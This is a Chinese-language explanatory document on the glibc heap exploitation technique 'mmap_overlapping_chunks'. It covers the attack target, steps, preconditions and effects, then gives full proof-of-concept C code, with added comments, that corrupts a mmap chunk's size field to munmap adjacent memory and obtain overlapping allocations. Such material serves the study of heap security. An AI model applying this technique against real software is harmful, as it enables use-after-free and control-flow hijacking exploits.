# 漏洞利用文档：mmap_overlapping_chunks

## 攻击对象
攻击对象是mmap chunks的size元数据字段。具体位置是第三个mmap chunk（例如调试记录中的地址`0x7ffff780b010`）的size字段（通过`chunk[-1]`访问）。size字段的第二位是mmap标志位（IS_MMAPPED），表示该chunk是通过mmap分配的。通过修改这个size字段，可以控制后续的munmap操作，释放错误的内存区域。

## 利用过程
1. **分配多个mmap chunks**：程序分配三个大的mmap chunks（每个大小0x100000），这些chunk在内存中按顺序排列（第三个在第二个之下，第二个在LibC之下，第一个在LibC之上）。
2. **修改size字段**：通过漏洞（如堆溢出）修改第三个chunk的size字段，使其值包含第二个chunk的大小（例如从0x101002修改为0x202002），创建内存重叠。
3. **触发free操作**：释放第三个chunk，由于size字段被修改，free函数会调用munmap释放第三个chunk和第二个chunk的内存区域（因为它们现在在size范围内重叠）。
4. **重新分配大chunk**：分配一个更大的chunk（大小0x300000），由于mmap阈值增加，新chunk会覆盖之前被munmap的内存区域。
5. **验证内存重叠**：通过指针计算，新chunk的某个偏移量恰好指向原第二个chunk的位置，写入数据验证重叠成功。

## 利用条件
- **内存破坏漏洞**：存在堆溢出、越界写或类似漏洞，允许修改mmap chunk的size字段。源码中通过直接赋值模拟了这种漏洞（第92行）。
- **mmap分配能力**：程序需要分配多个大的mmap chunks（大小超过mmap阈值）。
- **控制free操作**：攻击者能触发free on a modified chunk，以滥用munmap。
- **无size验证**：Glibc在free时不会充分验证mmap chunk的size字段合理性，只检查mmap标志位。

## 利用效果
- **内存重叠**：导致两个或多个指针指向同一内存区域（例如`mmap_chunk_2`和`overlapping_chunk[distance]`），实现Use-After-Free（UAF）。
- **任意地址写入**：通过重叠的chunk，可以写入到原本已释放的内存区域，可能修改敏感数据或代码指针。
- **控制流劫持潜力**：如果重叠区域包含函数指针、GOT表或堆元数据，可能进一步劫持控制流。
- **绕过内存保护**：munmap通常将内存返回内核，但通过重新分配，攻击者重新获得对已释放内存的控制，绕过常规的释放后不可用保护。

## 涉及缓解机制
在Glibc中，free函数处理mmap chunks时，会检查size字段的IS_MMAPPED位（第二位）。如果设置，则调用munmap释放内存。但缺乏对size字段的合理性检查，导致漏洞。相关源码片段来自Glibc malloc.c：

```c
// From Glibc malloc.c (around line 2845 in version 2.26)
void free(void* mem) {
  // ... 
  if (chunk_is_mmapped(p)) { // Macro: #define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
    munmap_chunk(p);
    return;
  }
  // ...
}
```

其中，`munmap_chunk`函数直接调用munmap系统调用，基于chunk的地址和size释放内存。如果size被恶意修改，munmap会释放错误大小的内存区域，导致安全 issues。Glibc没有内置机制验证mmap chunk的size是否与原始分配一致。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释解释关键步骤。

```c
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <unistd.h>

/*
Technique should work on all versions of GLibC
Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`

POC written by POC written by Maxwell Dulin (Strikeout) 
*/
int main()
{
	/*
	A primer on Mmap chunks in GLibC
	==================================
	In GLibC, there is a point where an allocation is so large that malloc
	decides that we need a seperate section of memory for it, instead 
	of allocating it on the normal heap. This is determined by the mmap_threshold var.
	Instead of the normal logic for getting a chunk, the system call *Mmap* is 
	used. This allocates a section of virtual memory and gives it back to the user. 

	Similarly, the freeing process is going to be different. Instead 
	of a free chunk being given back to a bin or to the rest of the heap,
	another syscall is used: *Munmap*. This takes in a pointer of a previously 
	allocated Mmap chunk and releases it back to the kernel. 

	Mmap chunks have special bit set on the size metadata: the second bit. If this 
	bit is set, then the chunk was allocated as an Mmap chunk. 

	Mmap chunks have a prev_size and a size. The *size* represents the current 
	size of the chunk. The *prev_size* of a chunk represents the left over space
	from the size of the Mmap chunk (not the chunks directly belows size). 
	However, the fd and bk pointers are not used, as Mmap chunks do not go back 
	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of 
	the chunk must be page-aligned.

	The POC below is essentially an overlapping chunk attack but on mmap chunks. 
	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. 
	The main difference is that mmapped chunks have special properties and are 
	handled in different ways, creating different attack scenarios than normal 
	overlapping chunk attacks. There are other things that can be done, 
	such as munmapping system libraries, the heap itself and other things.
	This is meant to be a simple proof of concept to demonstrate the general 
	way to perform an attack on an mmap chunk.

	For more information on mmap chunks in GLibC, read this post: 
	http://tukan.farm/2016/07/27/munmap-madness/
	*/

	int* ptr1 = malloc(0x10); // 分配一个小chunk，可能用于初始化堆或触发分配

	printf("This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n");
	printf("Extremely large chunks are special because they are allocated in their own mmaped section\n");
	printf("of memory, instead of being put onto the normal heap.\n");
	puts("=======================================================\n");
	printf("Allocating three extremely large heap chunks of size 0x100000 \n\n");
		
	long long* top_ptr = malloc(0x100000); // 分配第一个mmap chunk，通常位于LibC之上
	printf("The first mmap chunk goes directly above LibC: %p\n",top_ptr);

	// After this, all chunks are allocated downwards in memory towards the heap.
	long long* mmap_chunk_2 = malloc(0x100000); // 分配第二个mmap chunk，位于LibC之下
	printf("The second mmap chunk goes below LibC: %p\n", mmap_chunk_2);

	long long* mmap_chunk_3 = malloc(0x100000); // 分配第三个mmap chunk，位于第二个chunk之下
	printf("The third mmap chunk goes below the second mmap chunk: %p\n", mmap_chunk_3);

	printf("\nCurrent System Memory Layout \n" \
"================================================\n" \
"running program\n" \
"heap\n" \
"....\n" \
"third mmap chunk\n" \
"second mmap chunk\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"first mmap chunk\n"
"===============================================\n\n" \
);
	
	printf("Prev Size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-2]); // 打印第三个chunk的prev_size字段
	printf("Size of third mmap chunk: 0x%llx\n\n", mmap_chunk_3[-1]); // 打印第三个chunk的size字段（包含mmap标志位）

	printf("Change the size of the third mmap chunk to overlap with the second mmap chunk\n");	
	printf("This will cause both chunks to be Munmapped and given back to the system\n");
	printf("This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n");

	// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.
	// Additionally, this same attack can be used with the prev_size instead of the size.
	mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2; // 关键漏洞：修改第三个chunk的size字段。清除mmap位后相加（0x101000 + 0x101000 = 0x202000），然后重新设置mmap位（| 2），得到0x202002。这使size包含第二个chunk的大小，创建重叠。
	printf("New size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-1]);
	printf("Free the third mmap chunk, which munmaps the second and third chunks\n\n");

	/*
	This next call to free is actually just going to call munmap on the pointer we are passing it.
	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845

	With normal frees the data is still writable and readable (which creates a use after free on 
	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this
	data is read or written to, the program crashes.
	
	Because of this added restriction, the main goal is to get the memory back from the system
	to have two pointers assigned to the same location.
	*/
	// Munmaps both the second and third pointers
	free(mmap_chunk_3); // 释放第三个chunk。由于size被修改，Glibc的free函数会调用munmap，释放第三个和第二个chunk的内存区域（因为它们现在在size范围内重叠）。内存返回内核，内容被清零。

	/* 
	Would crash, if on the following:
	mmap_chunk_2[0] = 0xdeadbeef;
	This is because the memory would not be allocated to the current program.
	*/

	/*
	Allocate a very large chunk with malloc. This needs to be larger than 
	the previously freed chunk because the mmapthreshold has increased to 0x202000.
	If the allocation is not larger than the size of the largest freed mmap 
	chunk then the allocation will happen in the normal section of heap memory.
	*/	
	printf("Get a very large chunk from malloc to get mmapped chunk\n");
	printf("This should overlap over the previously munmapped/freed chunks\n");
	long long* overlapping_chunk = malloc(0x300000); // 分配一个更大的chunk（0x300000）。由于mmap阈值已增加，且新大小大于之前释放的chunk，它会被mmap分配，并覆盖之前被munmap的区域（第二个和第三个chunk的内存）。
	printf("Overlapped chunk Ptr: %p\n", overlapping_chunk);
	printf("Overlapped chunk Ptr Size: 0x%llx\n", overlapping_chunk[-1]);

	// Gets the distance between the two pointers.
	int distance = mmap_chunk_2 - overlapping_chunk; // 计算原第二个chunk指针和新chunk指针之间的距离。调试记录中distance为0x40000（262144字节），但注意指针算术：long long*类型，所以实际字节偏移为distance * 8。
	printf("Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n", distance);
	printf("Value of index 0 of mmap chunk 2 prior to write: %llx\n", mmap_chunk_2[0]); // 打印原第二个chunk的第一个值，应为0（因为被munmap后内存清零）
	
	// Set the value of the overlapped chunk.
	printf("Setting the value of the overlapped chunk\n");
	overlapping_chunk[distance] = 0x1122334455667788; // 通过新chunk写入数据。由于内存重叠，overlapping_chunk[distance]实际上指向原第二个chunk的位置（mmap_chunk_2）。写入0x1122334455667788。

	// Show that the pointer has been written to.
	printf("Second chunk value (after write): 0x%llx\n", mmap_chunk_2[0]); // 打印原第二个chunk的值，现在应为0x1122334455667788，证明内存重叠。
	printf("Overlapped chunk value: 0x%llx\n\n", overlapping_chunk[distance]); // 打印新chunk的相同偏移值，同样为0x1122334455667788。
	printf("Boom! The new chunk has been overlapped with a previous mmaped chunk\n");
	assert(mmap_chunk_2[0] == overlapping_chunk[distance]); // 断言验证重叠成功：两个指针指向的值相等。

	_exit(0); // 提前退出，避免可能的内存破坏导致崩溃（例如损坏库）。
}
```

此PoC演示了如何通过修改mmap chunk的size字段，实现内存重叠攻击。关键步骤已用中文注释标出。